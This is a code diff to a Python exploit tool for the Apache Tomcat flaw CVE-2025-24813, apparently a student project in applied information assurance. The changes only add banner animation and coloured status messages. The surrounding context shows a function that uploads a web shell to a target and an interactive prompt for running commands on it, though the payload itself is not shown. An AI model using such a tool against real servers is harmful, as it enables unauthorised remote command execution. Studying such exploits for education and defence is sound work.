@@ -35,19 +35,24 @@ def print_banner():
     for name in filenames:
         with open(name, "r", encoding="utf-8") as f:
             frames.append(f.read())
-
     end_time = time.time() + 3
     while time.time() < end_time:
-        for frame in frames:
+        for i, frame in enumerate(frames):
+            if i == len(frames) - 1:
+                os.system("clear")
+            else:
+                sys.stdout.flush()
             sys.stdout.write('\033[2J\033[H')
             sys.stdout.write(banner + frame)
-            sys.stdout.flush()
+
             time.sleep(0.3)
+    print()
 
 
 
 CYAN = Fore.CYAN + Style.BRIGHT
 RED = Fore.RED + Style.BRIGHT
+GREEN = Fore.GREEN + Style.BRIGHT
 RESET = Style.RESET_ALL
 
 text = "By: Mitchell Zhou, Yunna Wang, Jeet Vijaywargi"
@@ -62,7 +67,9 @@ banner = f"""
 ╔═══════════════════════════════════════════════════════╗
 ║{RED} Applied Information Assurance {RESET}| {CYAN}Tomcat_CVE-2025-24813{RESET} ║
 ╚═══════════════════════════════════════════════════════╝
-   🕵️ {text} 👮
+   🕵️  {text} 👮
+   
+{CYAN}Uploading Payload...{RESET}
 """
 
 def upload_shell(target):
@@ -77,11 +84,11 @@ def upload_shell(target):
         )
 
         if response.status_code in [200, 201, 204]:
-            print(f"[+] Shell uploaded to: {shell_url}")
+            print(f"{GREEN}[+] Shell Successfully uploaded to: {shell_url}{RESET}")
             return True
-        print(f"[-] Upload failed (HTTP {response.status_code})")
+        print(f"{RED}[-] Upload failed (HTTP {response.status_code}){RESET}")
     except Exception as e:
-        print(f"[-] Upload error: {e}")
+        print(f"{RED}[-] Upload error: {e}{RESET}")
     return None
 
 
@@ -110,7 +117,7 @@ def main():
 
     # Test command execution
     print("\nEnter commands to execute (or 'exit' to quit):")
-    print(f"{RED}Commands are run separately. Chain them with ';' to execute together.")
+    print(f"🚨{RED}Commands are ran separately. Chain them with ';' to execute together.{RESET}🚨")
     while True:
         cmd = input("$ ")
         if cmd.lower() in ['exit', 'quit']:
